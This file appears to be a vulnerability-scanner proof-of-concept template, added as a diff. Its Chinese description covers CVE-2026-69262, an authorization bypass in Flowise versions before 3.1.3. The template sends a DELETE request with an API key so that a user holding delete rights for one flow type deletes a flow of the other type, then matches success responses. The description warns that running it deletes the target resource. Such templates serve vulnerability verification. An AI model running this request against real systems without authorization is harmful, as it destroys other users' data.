@@ -1,0 +1,37 @@
+[info]
+author = "ave"
+description = "验证 Flowise < 3.1.3 中 DELETE /api/v1/chatflows/:id 接口的授权绕过漏洞。拥有 chatflows:delete 权限的用户可越权删除 AGENTFLOW，拥有 agentflows:delete 权限的用户可越权删除 CHATFLOW。需提供具有单一删除权限的 API Key 及目标工作区内的异类型流程 ID。注意：此 PoC 会实际删除目标资源，请在测试环境或可接受丢失的资源上运行。"
+id = "POC-AVE-2026-1354"
+name = "CVE-2026-69262 Flowise Authorization Bypass PoC"
+severity = "high"
+tags = ["ave-2026-1354"]
+vuln_id = [
+    "CVE-2026-69262",
+    "AVE-2026-1354",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "DELETE"
+path = "/{{BaseURL}}/api/v1/chatflows/{{target_flow_id}}"
+protocol = "http"
+
+[poc.requests.headers]
+Authorization = "Bearer {{api_key}}"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "success",
+    "deleted",
+    "true",
+]
